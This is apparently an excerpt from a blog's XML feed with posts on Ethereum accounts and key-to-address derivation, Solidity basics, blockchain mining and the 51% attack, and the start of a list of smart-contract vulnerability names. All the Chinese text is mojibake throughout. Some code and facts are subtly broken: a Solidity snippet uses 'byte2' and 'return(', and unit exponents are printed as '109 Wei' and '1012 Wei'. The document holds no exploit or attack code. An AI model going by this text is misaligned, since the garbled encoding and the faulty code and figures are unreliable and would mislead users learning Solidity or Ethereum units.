å’Œæ•°æ®ï¼ˆçŠ¶æ€ï¼‰çš„é›†åˆã€‚å‡†å›¾çµå®Œå¤‡</p><p>å…¸å‹åº”ç”¨ï¼šä»£å¸ï¼šEOSï¼Œæ¸¸æˆï¼šè¿·æ‹çŒ«</p><p>ç¼–ç¨‹è¯­è¨€ï¼šSolidity Solidity æ˜¯ä¸€ç§ç”¨äºç¼–å†™æ™ºèƒ½åˆçº¦çš„é«˜çº§è¯­è¨€ï¼Œè¿è¡Œåœ¨Ethereum è™šæ‹Ÿæœºï¼ˆä»¥å¤ªåŠè™šæ‹Ÿæœºï¼ŒEVMï¼‰ä¹‹ä¸Š Solidity è¯­è¨€çš„è¯­æ³•æ¥è¿‘äºJavaScriptï¼Œæ˜¯ä¸€ç§é¢å‘å¯¹è±¡çš„è¯­è¨€é™æ€è¯­è¨€ï¼Œ <code>.sol</code> åç¼€ã€‚</p><p>Solidity æ˜¯ä¸€ç§å›¾çµå®Œå¤‡çš„ç¼–ç¨‹è¯­è¨€ï¼Œæ‰€ä»¥ç¼–ç¨‹çš„æ–¹å¼ä¸Javaã€C++ç±»ä¼¼ã€‚ä¸è¿‡ Solidityè¯­è¨€ä¸­å¹¶æ²¡æœ‰ç±»çš„æ¦‚å¿µï¼Œä½†æœ‰ä¸€ä¸ªåˆçº¦çš„æ¦‚å¿µï¼Œç”¨å…³é”®å­— contract è¡¨ç¤ºã€‚</p><h2 id="account">Account</h2><p>åœ°å€(Address)ï¼š20 å­—èŠ‚ çŠ¶æ€(State)</p><p>è´¦æˆ·åˆ†ç±»ï¼š</p><p>å¤–éƒ¨è´¦æˆ·(EOA) Externally owned account åˆçº¦è´¦æˆ·:å½“åˆçº¦çš„å­—èŠ‚ç è¢«éƒ¨ç½²åˆ°åŒºå—é“¾æ—¶ï¼Œä¾¿ä¼šæœ‰ä¸€ä¸ªç‰¹å®šçš„åœ°å€æ¥æ ‡è¯†åˆçº¦ï¼Œè¿™ä¸ªåœ°å€ä¾¿æˆä¸ºåˆçº¦è´¦æˆ·ã€‚</p><p>ä» EVM è§’åº¦æ¥è¯´ï¼Œè¿™ä¸¤ä¸ªè´¦æˆ·æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯ä»–ä»¬è¿˜æ˜¯æœ‰ä¸€äº›åŒºåˆ«ã€‚</p><h3 id="è´¦æˆ·ç»„æˆ">è´¦æˆ·ç»„æˆ</h3><p>ä¸‰ä¸ªéƒ¨åˆ†éƒ½æ˜¯ä»¥ 16 è¿›åˆ¶å­˜å‚¨</p><p>å½“æˆ‘ä»¬åœ¨ Metamask ä¸Šé¢åˆ›å»ºä¸€ä¸ªè´¦æˆ·æ—¶ï¼Œæœ‰ä¸‰ä¸ªä¸»è¦ç»„æˆéƒ¨åˆ†:ä¸‰ä¸ªéƒ¨åˆ†éƒ½æ˜¯ä»¥ 16 è¿›åˆ¶å­˜å‚¨</p><ol type="1"><li>Account Address Account Address is a unique identifierï¼Œlike a emailaddress or unique username.ä¸€ä¸ªè´¦æˆ·é€‚ç”¨äºæ‰€æœ‰çš„ä»¥å¤ªåŠç½‘ç»œï¼Œä½†æ˜¯ä¸€ä¸ªè´¦æˆ·åœ¨ä¸åŒç½‘ç»œä¸­çš„ä»¥å¤ªå¸æ•°é‡ä¸è¯¥ç½‘ç»œç»‘å®šçš„ï¼Œå³:æŸä¸ªç½‘ç»œè®¤ä¸ºè¯¥åœ°å€æœ‰ä¸€å®š etherï¼Œ å¦ä¸€ä¸ªç½‘ç»œå´è®¤ä¸ºå®ƒæ²¡æœ‰ã€‚</li><li>Public Key</li><li>Private Key</li></ol><p>ç§é’¥ã€å…¬é’¥å’Œåœ°å€æ˜¯å¦‚ä½•ç”Ÿæˆçš„ï¼Ÿ å¤§ä½“æ¥è¯´ï¼Œåœ°å€çš„ç”Ÿæˆçš„æµç¨‹æ˜¯ï¼šç§é’¥-&gt; å…¬é’¥ -&gt; åœ°å€ã€‚å› æ­¤åœ°å€çš„ç”Ÿæˆéœ€è¦ä¸‰æ­¥ï¼š</p><p>ç”Ÿæˆä¸€ä¸ªéšæœºçš„ç§é’¥ï¼ˆ32 å­—èŠ‚ï¼‰ é€šè¿‡ç§é’¥ç”Ÿæˆå…¬é’¥ï¼ˆ64 å­—èŠ‚ï¼‰é€šè¿‡å…¬é’¥å¾—åˆ°åœ°å€ï¼ˆ20 å­—èŠ‚ï¼‰</p><p>ç§é’¥æ¨å¯¼å…¬é’¥ ç§é’¥æ˜¯ä¸€ç»„ 64 ä½çš„ 16è¿›åˆ¶å­—ç¬¦ï¼Œé€šè¿‡ç§é’¥æˆ‘ä»¬èƒ½å¤Ÿè®¿é—®ä¸€ä¸ªè´¦æˆ·ã€‚ä»¥å¤ªåŠçš„ç§é’¥ç”Ÿæˆæ˜¯é€šè¿‡ secp256k1æ¤­åœ†æ›²çº¿ç®—æ³•ç”Ÿæˆçš„ï¼Œsecp256k1 æ˜¯ä¸€ä¸ªæ¤­åœ†æ›²çº¿ç®—æ³•ï¼ŒåŒæ¯”ç‰¹å¸ã€‚</p><p>å…¬é’¥æ¨å¯¼åœ°å€å’Œæ¯”ç‰¹å¸ç›¸æ¯”ï¼Œåœ¨ç§é’¥ç”Ÿæˆå…¬é’¥è¿™ä¸€æ­¥å…¶å®æ˜¯ä¸€æ ·çš„ï¼ŒåŒºåˆ«åœ¨å…¬é’¥æ¨å¯¼åœ°å€ç¬¬ä¸€éƒ¨åˆ†ï¼Œä»¥å¤ªåŠä¸­éåœ§ç¼©å‹å…¬é’¥çš„å¤„ç†å°±ç®€å•ç²—æš´å¾ˆå¤šäº†ï¼Œä¸‹å›¾ä¸ºPublic Key ç”Ÿæˆ Address çš„è¿‡ç¨‹ã€‚</p><p>ä»¥å¤ªåŠåœ°å€ç”Ÿæˆçš„è¿‡ç¨‹ ç¬¬ä¸€æ­¥ï¼šç§é’¥ (private key)</p><p>ä¼ªéšæœºæ•°äº§ç”Ÿçš„ 256bit ç§é’¥ç¤ºä¾‹(256bit 16 è¿›åˆ¶ 32 å­—èŠ‚)</p><p>18e14a7b6a307f426a94f8114701e7c8e774e7f9a47e2c2035db29a206321725</p><p>ç¬¬äºŒæ­¥ï¼šå…¬é’¥ (public key)</p><ol type="1"><li>é‡‡ç”¨æ¤­åœ†æ›²çº¿æ•°å­—ç­¾åç®—æ³• ECDSA-secp256k1 å°†ç§é’¥ï¼ˆ32å­—èŠ‚ï¼‰æ˜ å°„æˆå…¬é’¥ï¼ˆ65 å­—èŠ‚ï¼‰ï¼ˆå‰ç¼€ 04+X å…¬é’¥+Y å…¬é’¥ï¼‰ï¼š</li></ol><p>04 ã€€ã€€50863ad64a87ae8a2fe83c1af1a8403cb53f53e486d8511dad8a04887e5b2352 ã€€ã€€2cd470243453a299fa9e77237716103abc11a1df38855ed6f2ee187e9c582ba6</p><pre><code>   2. æ‹¿å…¬é’¥ï¼ˆéå‹ç¼©å…¬é’¥ï¼‰æ¥hashï¼Œè®¡ç®—å…¬é’¥çš„ Keccak-256 å“ˆå¸Œå€¼ï¼ˆ32bytesï¼‰ï¼š</code></pre><p>fc12ad814631ba689f7abe671016f75c54c607f082ae6b0881fac0abeda21781</p><pre><code>   3. å–ä¸Šä¸€æ­¥ç»“æœå–å20byteså³ä»¥å¤ªåŠåœ°å€ï¼š</code></pre><p>1016f75c54c607f082ae6b0881fac0abeda21781</p><p>ç¬¬ä¸‰æ­¥ï¼šåœ°å€ (address)</p><p>0x1016f75c54c607f082ae6b0881fac0abeda21781</p><h3 id="è´¦æˆ·å…³ç³»">è´¦æˆ·å…³ç³»</h3><p>æ¶ˆæ¯åªèƒ½ç”±å¤–éƒ¨è´¦æˆ·(EOA)å‘èµ·ã€‚æœªæ¿€æ´»çŠ¶æ€ä¸‹ï¼Œåˆçº¦è´¦æˆ·ä¸èƒ½ä¸»åŠ¨åˆ›å»ºäº¤æ˜“ï¼Œåªèƒ½è¢«åŠ¨è§¦å‘ã€‚</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/2020561588727456628.png"alt="account relationship" /><figcaption aria-hidden="true">account relationship</figcaption></figure><h2 id="wallet">wallet</h2><p>Geth(Go)ã€Mistã€MetaMask</p><h2 id="transaction">Transaction</h2><p>ä½œä¸ºåç»­åšé¡¹ç›®çš„å‡†å¤‡ï¼Œé¦–å…ˆæˆ‘ä»¬å¯ä»¥ç´¢å–ä¸€äº›æµ‹è¯• Etheråˆ°è‡ªå·±çš„é’±åŒ…ä¸­ï¼Œä¸€äº›å¯ä»¥è·å¾—æµ‹è¯• Ether çš„ç½‘å€å¦‚ä¸‹:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://faucet.ropsten.be/</span><br><span class="line">https://faucet.rinkeby.io/</span><br><span class="line">https://www.rinkeby.io/#faucet</span><br></pre></td></tr></table></figure><h3 id="è·å¾—-ether-çš„åŸç†">è·å¾— Ether çš„åŸç†</h3><ol type="1"><li><p>å¤§è‡´è¿‡ç¨‹ æˆ‘ä»¬æäº¤è‡ªå·±çš„åœ°å€ï¼Œæœ€ç»ˆä¾¿ä¼šå‘ç”Ÿä¸€ç¬”å‘æˆ‘ä»¬è½¬å…¥ Etheräº¤æ˜“ï¼Œ å…¶è¿‡ç¨‹/åŸç†å¦‚ä¸‹: <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/eth_transaction.png"alt="eth_transaction" /></p></li><li><p>ä¸€ä¸ª Transaction object çš„ç»“æ„ï¼š <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/eth_transaction_header.png"alt="eth_transaction_header" /></p></li></ol><p>vï¼Œrï¼Œs ç”±å‘é€è€…ç§é’¥ç”Ÿæˆï¼Œè¿›è¡Œæ•°å­—ç­¾åã€‚è¾¾åˆ°æˆæƒå’Œè®¤è¯çš„ç›®çš„ã€‚</p><ol type="1"><li>Transaction object ä¸ä»¥å¤ªç½‘ç»œ We send the transaction to onespecific node in The Ethereum Networkã€‚That node will communicating therest of nodes in the networkã€‚ The node have one entire copy ofblockchain. ç”±äºèŠ‚ç‚¹ä¼—å¤šï¼Œæœ‰æ—¶å€™ä¸€ä¸ªèŠ‚ç‚¹å¯èƒ½ä¼šåŒæ—¶æ¥å—å¤šä¸ªäº¤æ˜“ã€‚èŠ‚ç‚¹å°†åŒæ—¶æ”¶åˆ°çš„äº¤æ˜“ï¼Œæ‰“åŒ…æˆä¸€ä¸ªäº¤æ˜“åˆ—è¡¨ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ‰€ç§°çš„â€œåŒºå—â€ï¼Œç„¶åèŠ‚ç‚¹è¿è¡Œ validation logicï¼Œä¹Ÿå°±æ˜¯æŒ–çŸ¿(mining)</li></ol><h3 id="æŒ–çŸ¿">æŒ–çŸ¿</h3><p>Anders discussion of blockchains and how they work is viewed as a'must watch' video</p><h2 id="gas">Gas</h2><p>äº¤æ˜“æ‰‹ç»­è´¹ Gas è´¹ç”¨ï¼šGas ä»·æ ¼ï¼ˆç”¨ä»¥å¤ªå¸è®¡ä»·ï¼‰*Gas æ•°é‡</p><p>åˆçº¦è¶Šå¤æ‚(è®¡ç®—ã€å†…å­˜å ç”¨ç­‰)ï¼Œéœ€è¦çš„ Gasè¶Šå¤šã€‚ä»»ä½•ä¸€ä¸ªç‰¹å®šçš„åˆçº¦éœ€è¦çš„ Gas æ•°é‡æ°¸è¿œéƒ½æ˜¯å›ºå®šçš„ã€‚</p><p>æ„¿æ„ä¸ºè¿™ç¬”äº¤æ˜“æ‰€ä»˜å‡ºçš„è´¹ç”¨é™åˆ¶ä¸€ä¸ªåˆçº¦è¿è¡Œçš„å·¥ä½œé‡ï¼Œé¿å…é˜»å¡æ•´ä¸ªç½‘ç»œã€‚</p><p>ä»¥å¤ªåŠçš„å•ä½ï¼š</p><p>æœ€å°å•ä½ï¼š1Weiï¼ˆä¼Ÿï¼‰ 109 Wei=1 Gwei 1012 Wei=1 szaboï¼ˆè¨åšï¼‰ 1015Wei=1fineyï¼ˆèŠ¬å°¼ï¼‰ 10^18 Wei=1 Ether</p><h2 id="ä»¥å¤ªåŠç½‘ç»œ">ä»¥å¤ªåŠç½‘ç»œ</h2><p>ä¸»ç½‘ã€æµ‹è¯•ç½‘ç»œã€ç§æœ‰é“¾ã€æ¨¡æ‹Ÿç¯å¢ƒ</p><h2 id="å»ä¸­å¿ƒåŒ–åº”ç”¨-dapp">å»ä¸­å¿ƒåŒ–åº”ç”¨ Dapp</h2><p>ä¼ ç»Ÿäº’è”ç½‘åº”ç”¨ ä¸­å¿ƒåŒ–ï¼Œå®¹æ˜“æ›´æ–°ï¼Œæ•°æ®å®Œå…¨æŒæ§ å»ä¸­å¿ƒåŒ–åº”ç”¨å»ä¸­å¿ƒåŒ–ï¼ŒæŒ‰è§„åˆ™è¿è¡Œ</p><p>å»ä¸­å¿ƒåŒ–åº”ç”¨æ¶æ„ <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/2020561588742276228.png"alt="Dapp structure" /></p><p>å‚è€ƒæ¨è: <ahref="http://blog.luoyuanhang.com/2018/04/17/eth-basis-accounts-address-pubkey-prikey/">ã€EthereumåŸºç¡€ã€‘ï¼šè´¦æˆ·ã€åœ°å€ã€ç§é’¥å’Œå…¬é’¥</a> <ahref="https://stevenocean.github.io/2018/04/02/about-ethereum-keystore.html">ä»¥å¤ªåŠè´¦æˆ·ç®¡ç†ä¹‹keystore æ–‡ä»¶(ç§‘æ™®)</a></p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Smart Contract and Solidity</title>
      <link href="/blog/2021/03/30/blockchain/ethereum/2.solidity_intro/"/>
      <url>/blog/2021/03/30/blockchain/ethereum/2.solidity_intro/</url>
      
        <content type="html"><![CDATA[<h1 id="solidity-ç¯å¢ƒé…ç½®ä¸ç®€ä»‹">Solidity ç¯å¢ƒé…ç½®ä¸ç®€ä»‹</h1><ol type="1"><li>é…ç½® remix-ide å’Œremixd,å…±äº«æœ¬åœ°æ–‡ä»¶ï¼Œé˜²æ­¢æ¸…é™¤æµè§ˆå™¨ç¼“å­˜ä¸¢å¤±åˆçº¦æ–‡ä»¶</li><li><a href="https://github.com/ethereum/remix-project/issues/833">è§£å†³remixed bug åªæŒ‡å‘ç›®å½•</a></li><li>Configure "Deploy &amp; Run Transactions" Plugin, so it uses ourMetaMask Wallet to access the Blockchain.</li></ol><h2 id="smart-contract">Smart Contract</h2><ul><li>A piece of code running on the blockchain.</li><li>It's a state machine.</li><li>Needs transactions to change stateï¼ˆStatechange happens throughmining+transactions.ï¼‰</li><li>Can do logic operations</li><li>It's turing complete That means <em>in theory</em> it can solve anycomputation problem</li></ul><h2 id="smart-contract-programming-language">Smart Contract ProgrammingLanguage</h2><p>Such as Solidityã€Vyperã€LLL etcï¼Œ they are all getting complied.What you actually send to the blockchain is EVM Bytecode.</p><p>Smart Contracts are running on the blockchainï¼ŒDeployed as EVMBytecode They are turing complete</p><h2 id="solidity">Solidity</h2><ul><li>The most popular smart contract programming language</li><li>Every high-level language code compiles to Bytecode.</li><li>Every Ethereum node in the network executes the same code Becauseevery node has a copy of chain.</li><li>Second popular language is Vyper which is research-oriented, derivedfrom Python.</li></ul><h2 id="introduction">Introduction</h2><p>æ–‡ä»¶ç»“æ„ æ•°æ®ç±»å‹ é”™è¯¯å¤„ç†(é€šè¿‡å›é€€) å‚æ•° æ§åˆ¶ç»“æ„ å¯è§æ€§ å‡½æ•°</p><h2 id="åˆçº¦æ–‡ä»¶ç»“æ„">åˆçº¦æ–‡ä»¶ç»“æ„</h2><ol type="1"><li>ç‰ˆæœ¬å£°æ˜</li><li>import</li><li>åˆçº¦<ol type="1"><li>çŠ¶æ€å˜é‡</li><li>å‡½æ•°</li><li>ç»“æ„ç±»å‹</li><li>æ—¶é—´</li><li>å‡½æ•°ä¿®æ”¹å™¨</li></ol></li><li>ä»£ç æ³¨é‡Š</li></ol><h2 id="ç‰ˆæœ¬å£°æ˜">ç‰ˆæœ¬å£°æ˜</h2><p>First line: Version Pragma, Pre-Compiler Statement Lock in theSolidity Compiler Version</p><p><code>pragma solidity ^0.4.24</code> æŒ‡å¤§äº 0.4.24 ç‰ˆæœ¬çš„ solidityç¼–è¯‘å™¨æ‰å¯ä»¥è¿è¡Œè¯¥æ–‡ä»¶ solidityç‰ˆæœ¬æ›´è¿­æ¯”è¾ƒå¿«ï¼Œå› æ­¤ä¸æä¾›å‘åå…¼å®¹ï¼ˆBackwardCompatibilityï¼‰ï¼šæŒ‡æ–°çš„ç‰ˆæœ¬çš„è½¯ï¼ç¡¬ä»¶å¯ä»¥ä½¿ç”¨è€ç‰ˆæœ¬çš„è½¯ï¼ç¡¬ä»¶äº§ç”Ÿçš„æ•°æ®ã€‚</p><h2 id="type">Type</h2><p>DataTypesï¼š(U)int, Boolean, Arrayï¼ŒStruct, Mapping. Addressï¼Œ<strong>No Floats!</strong></p><h3 id="å€¼ç±»å‹">å€¼ç±»å‹</h3><p><ahref="https://solidity.readthedocs.io/en/v0.6.7/types.html">solidity0.6.7 types</a></p><p><strong>å¸ƒå°”ç±»å‹</strong>ï¼ˆBooleansï¼‰<strong>æ•´å‹</strong>ï¼ˆIntegersï¼‰ å®šé•¿æµ®ç‚¹å‹ï¼ˆFixed Point Numbersï¼‰å®šé•¿å­—èŠ‚æ•°ç»„ï¼ˆFixed-size byte arraysï¼‰ æœ‰ç†æ•°å’Œæ•´å‹å¸¸é‡ï¼ˆRational andInteger Literalsï¼‰ <strong>å­—ç¬¦ä¸²å¸¸é‡</strong>ï¼ˆString literalsï¼‰åå…­è¿›åˆ¶å¸¸é‡ï¼ˆHexadecimal literalsï¼‰ æšä¸¾ï¼ˆEnumsï¼‰ å‡½æ•°ç±»å‹ï¼ˆFunctionTypesï¼‰ <strong>åœ°å€ç±»å‹</strong>ï¼ˆAddressï¼‰ åœ°å€å¸¸é‡ï¼ˆAddressLiteralsï¼‰</p><h4 id="bool">bool</h4><p>å–å€¼ï¼š<code>true/false</code> è¿ç®—ç¬¦ (ä¸‰ç§é€»è¾‘è¿ç®—ä»¥åŠç­‰äºã€ä¸ç­‰äº)<code>!</code>ã€<code>&amp;&amp;</code>ã€<code>||</code>ã€<code>==</code>ã€<code>!=</code></p><h4 id="intuint">int/uint</h4><p>int å’Œ uint éƒ½æ”¯æŒåé¢åŠ æ•°å­—ï¼Œå…³é”®å­— uint8 åˆ° uint256(ä»¥ 8 æ­¥è¿›)è¿ç®—ç¬¦: æ¯”è¾ƒè¿ç®—: <code>&lt;=, &lt;, ==, !=, &gt;=, &gt;</code> ä½è¿ç®—:<code>&amp;, |, ^(å¼‚æˆ–),~ï¼ˆä½å–åï¼‰</code> ç®—æœ¯è¿ç®—:<code>+,-,ä¸€å…ƒè¿ç®—ç¬¦-, ä¸€å…ƒè¿ç®—+ï¼Œ*ï¼Œ/,%(å–ä½™æ•°)ï¼Œ**(å¹‚)ï¼Œ&lt;&lt;ï¼ˆå·¦ç§»ä½ï¼‰ï¼Œ&gt;&gt;ï¼ˆå³ç§»ä½ï¼‰</code></p><h4 id="literals">literals</h4><p>å››ç±»å¸¸é‡</p><ol type="1"><li>æœ‰ç†æ•°å’Œæ•´å‹å¸¸é‡ï¼ˆRational and Integer literalsï¼‰å¸¸é‡è¿ç®—ä¸ä¼šæœ‰æº¢å‡º</li><li>å­—ç¬¦ä¸²å¸¸é‡(String literals)<ol type="1"><li>å¯ä»¥éšå¼åœ°è½¬æ¢ä¸ºè‡ªå·±æ•°ç»„æˆ–è€…å­—ç¬¦ä¸²æ•°ç»„</li><li>å­—ç¬¦ä¸²å¸¸é‡å’Œ Cï¼ŒC++ä¸ä¸€æ ·ï¼Œæ²¡æœ‰ç»“å°¾çš„ ''ï¼Œå³ï¼šæœ‰å‡ ä¸ªå­—ç¬¦å°±æ˜¯å‡ ä¸ªå­—èŠ‚</li></ol></li><li>åå…­è¿›åˆ¶å¸¸é‡(Hexadecimal literals) <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">restHexLiterals</span>(<span class="params"></span>) public constant <span class="keyword">return</span>(byte2, byte1, byte1)&#123;</span><br><span class="line">    byte2 a = hex<span class="string">&quot;abcd&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (a,a[<span class="number">0</span>], a[<span class="number">1</span>])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><code>byte&#123;n&#125;</code> è¡¨ç¤º n ä¸ªå­—èŠ‚çš„æ•°ç»„</li><li>åœ°å€å¸¸é‡(Address Literals)</li></ol><h4 id="åœ°å€ç±»å‹">åœ°å€ç±»å‹</h4><p>addressï¼šè¡¨ç¤ºä¸€ä¸ªè´¦æˆ·åœ°å€ï¼ˆ20 å­—èŠ‚ï¼‰<code>0x72ba7d8e73fe8eb666ea66babc8116a41bfb10e2</code> æˆå‘˜å±æ€§ï¼šbalance å‡½æ•°ï¼štransfer()</p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åŒºå—é“¾çš„åŸç†</title>
      <link href="/blog/2021/03/15/blockchain/1.principle/"/>
      <url>/blog/2021/03/15/blockchain/1.principle/</url>
      
        <content type="html"><![CDATA[<h1 id="åŒºå—é“¾çš„åŸç†">åŒºå—é“¾çš„åŸç†</h1><p><a href="https://coindemo.io/">Coin Demo - Cryptocurrency Demo</a> <ahref="https://andersbrownworth.com/blockchain/">Blockchain Demo</a> <ahref="https://blockchaindemo.io/">blockchaindemo</a></p><p>åŒºå—é“¾æ˜¯ç”±ä¸€ç³»åˆ—åŒºå—ç»„æˆï¼Œæ¯ä¸ªåŒºå—åŒ…æ‹¬å¦‚ä¸‹å‡ éƒ¨åˆ†ä¿¡æ¯:</p><p>A blockchain has a list of blocks.</p><p>It starts with a single block, called the genesis block. Each blockstores the following information:<code>Indexã€Timestampã€Hashã€Previous hashã€Dataã€Nonce</code></p><h2 id="ç»„æˆ">ç»„æˆ</h2><h3 id="index"><code>Index</code></h3><p>The index is the position of the block in the chain. The genesisblock has an index of 0. The next block will have an index of 1.</p><h3 id="timestamp"><code>Timestamp</code></h3><p>A record of when the block was created. The timestamp helps to keepthe blockchain in order.</p><h3 id="hash"><code>Hash</code></h3><p>A hash looks like a bunch of random numbers and letters. It is aalphanumeric value that uniquely identifies data, or the "digitalfingerprint" of data.</p><h4 id="properties-of-a-hash">Properties of a hash</h4><ol type="1"><li>Hash has a fixed length.</li><li>Same data always maps to same hash.</li><li>Different data always maps to a different hash (within practicallimitations).</li><li>Is easy to compute.</li><li>Is infeasible to convert hash to data.</li><li>A small change in data leads to a large change in hash.</li></ol><h4 id="valid-hash">Valid Hash</h4><p>A valid hash for a blockchain is a hash that meets a certainrequirement. For this blockchain, having three zeros at the beginning ofthe hash is the requirement for a valid hash. The number of leadingzeros required is the difficulty.</p><h4 id="block-hash-calculation">Block Hash Calculation</h4><p>A hashing function takes data as input, and returns a uniquehash.</p><p>f ( data ) = hash</p><p>Since the hash is a "digital fingerprint" of the entire block, thedata is the combination of index, timestamp, previous hash, block data,and nonce.</p><p><code>f ( index + previous hash + timestamp + data + nonce ) = hash</code></p><p>Replace the values for our genesis block, we get:</p><p><code>f ( 0 + "0" + 1508270000000 + "Welcome to Blockchain Demo 2.0!" + 604 ) = 000dc75a315c77a1f9c98fb6247d03dd18ac52632d7dc6a9920261d8109b37cf</code></p><h4 id="previous-hash">Previous hash</h4><p>The previous hash is the hash of the previous block.</p><p>The genesis block's previous hash is "0" because there is no previousblock.</p><h2 id="data">Data</h2><p>Each block can store data against it. In cryptocurrencies such asBitcoin, the data would include money transactions.</p><h2 id="nonce">nonce</h2><p>The nonce is the number used to find a valid hash.</p><p>To find a valid hash, we need to find a nonce value that will producea valid hash when used with the rest of the information from thatblock.</p><h2 id="mining-a-block">Mining a block</h2><p>The process of determining this nonce is called mining.</p><p>We start with a nonce of 0 and keep incrementing it by 1 until wefind a valid hash.</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/nonce.a6291d01.gif"alt="mining a block" /><figcaption aria-hidden="true">mining a block</figcaption></figure><p>As difficulty increases, the number of possible valid hashesdecreases. With fewer possible valid hashes, it takes more processingpower to find a valid hash.</p><p>If the hash on the block is invalid, click on the tool button to minethe genesis block!</p><h2 id="data-mutation">Data mutation</h2><p>Edit the "Welcome to Blockchain Demo 2.0!" input!</p><p>Since data is an input variable for the hash, changing the data willchange the hash.</p><p>The new hash will not have three leading zeros, and therefore becomesinvalid.</p><h2 id="mutation-effect">MUTATION EFFECT</h2><p>Subsequent blocks will also be invalid.</p><p>A hash change will cause a mutation in the previous hash ofsubsequent blocks. Since previous hash is used to calculate the hash,subsequent hashes will also change.</p><p>This will lead to a cascading invalidation of blocks.</p><p>Try it yourself:</p><p>Add 3 blocks, then mutate the genesis block input.</p><h2 id="adding-a-new-block">ADDING A NEW BLOCK</h2><p>To mine another block to the blockchain, fill out the data input andclick the button.</p><h2 id="adding-valid-blocks">ADDING VALID BLOCKS</h2><p>When adding a new block to the blockchain, the new block needs tomeet these requirements.</p><p>Block index one greater than latest block index. Block previous hashequal to latest block hash. Block hash meets difficulty requirement.Block hash is correctly calculated. Other peers on the network will beadding blocks to the blockchain, so new blocks need to be validated.</p><h2 id="peer-to-peer-network">PEER-TO-PEER NETWORK</h2><p>A global network of computers work together to keep the blockchainsecure, correct, and consistent.</p><h2 id="add-peer">ADD PEER</h2><p>Click the button to add a peer to the network.</p><h2 id="peer-status">PEER STATUS</h2><p>Peers have three states:</p><ol type="1"><li>Currently Active</li><li>Connected</li><li>Disconnected</li></ol><p>To change peer: Click on the desired peer.</p><p>To connect to a peer: On a red peer, click .</p><p>To see history between peer: On a green peer, click .</p><p>To disconnect with peer: On a green peer, click .</p><h2 id="peer-messages">PEER MESSAGES</h2><p>Peers ask for each other's blocks to determine who has the mostup-to-date blockchain.</p><h2 id="peer-communication">PEER Communication</h2><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20205251590407624467.png"alt="peer communication" /><figcaption aria-hidden="true">peer communication</figcaption></figure><h2 id="p2p-tour-pt.1">P2P Tour PT.1</h2><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20205251590407749347.png"alt="part1" /><figcaption aria-hidden="true">part1</figcaption></figure><ol start="0" type="1"><li>Start with the genesis block.</li><li>Add a peer &amp; connect.</li><li>Add a block.</li><li>Check history between peer.</li></ol><h2 id="p2p-tour-pt.2">P2P Tour PT.2</h2><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20205251590407902630.png"alt="longest rule" /><figcaption aria-hidden="true">longest rule</figcaption></figure><p>The longer valid chain takes precedent over a shorter chain. Alsocalled longest chain rule.</p><h2 id="p2p-tour-pt.3">P2P Tour PT.3</h2><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20205251590407958803.png"alt="part3" /><figcaption aria-hidden="true">part3</figcaption></figure><p>After receiving the longest valid chain, it will broadcast its latestblock to its peers.</p><p>Eventually, all the peers on the network will have the longest validchain.</p><h2 id="immutability">Immutability</h2><p>If a block is mutated, the block, and subsequent blocks becomeinvalid.</p><p>Invalid blocks are rejected by the peers on the network. They need tobe re-mined to be valid.</p><p>Earlier blocks will be harder to corrupt because there are moresubsequent invalid blocks to re-mine.</p><p>Because peers on the network are always adding new valid blocks, thehacker would have to outmine the network, which requires majorityprocessing power.</p><h2 id="attack">51% Attack</h2><p>If a participant has more than 51% of the network, he could out-minethe network and hack the blockchain.</p><p>When there are more miners in the network, the processing powerbecomes more distributed and no one has majority power. This leads to amore secure blockchain.</p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦æ¼æ´æ€»ç»“</title>
      <link href="/blog/2021/03/15/blockchain/eth_vulns/eth_vulns/"/>
      <url>/blog/2021/03/15/blockchain/eth_vulns/eth_vulns/</url>
      
        <content type="html"><![CDATA[<h4 id="ä»£ç è§„èŒƒ">ä»£ç è§„èŒƒ</h4><ul><li>ERC Standard / Deprecated standard</li><li>Unindexed ERC20 Event Parameters</li><li>Transfer To Zero Address</li><li>Use of Deprecated Solidity Functions Compiler Version<ul><li>Outdated Compiler Version</li><li>Compiler version not fixed</li></ul></li><li>Unused Variables</li><li>No Return/ Unused Return</li><li>Overload Syscall</li><li>Unprotected SELFDESTRUCT Instruction / Destroyable contracts</li><li>Fake Recharge Vulnerability(å‡å……å€¼)</li><li>Incorrect Constructor Name</li><li>Code With No Effects</li><li>Presence of unused variables</li><li>Typographical Error</li><li>Unencrypted Private Data On-Chain</li><li>Locked money / Freezing etherÂ (åªæœ‰å­˜é’±paybableï¼Œæœªè‡ªå·±å®ç°ä¸€ä¸ªè½¬è´¦å‡½æ•°ï¼‰</li><li>Keeping secrets / Private modifier</li><li>Type casts / Unsafe type inference</li><li>Style guide violation(å‘½åæ ¼å¼)</li><li>Uninitialized storage/state/local variables</li><li>Assembly usage<ul><li>Constant functions using assembly code</li></ul></li><li>misuse of a Boolean constant</li><li>Constant functions changing the state</li><li>Dangerous strict equalities</li></ul><h4 id="arithmetic-issues">Arithmetic Issues</h4><ul><li>Exponent Arithmetic Overflowï¼ˆç®—æ•°æº¢å‡ºï¼‰</li><li>Integer Overflow / 